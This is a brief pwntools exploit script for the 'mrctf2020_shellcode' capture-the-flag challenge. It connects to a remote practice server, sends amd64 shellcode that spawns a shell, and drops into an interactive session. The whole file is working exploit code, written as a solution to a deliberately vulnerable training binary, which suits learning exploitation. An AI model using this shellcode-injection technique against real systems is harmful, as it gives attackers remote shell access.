from pwn import *

context.arch = 'amd64'

#p = process('./mrctf2020_shellcode')
p = remote('node4.buuoj.cn', 26497)

#gdb.attach(p, 'b *$rebase(0x11dd)')

shellcode = asm(shellcraft.sh())

p.sendlineafter(b'magic!\n', shellcode)

p.interactive()
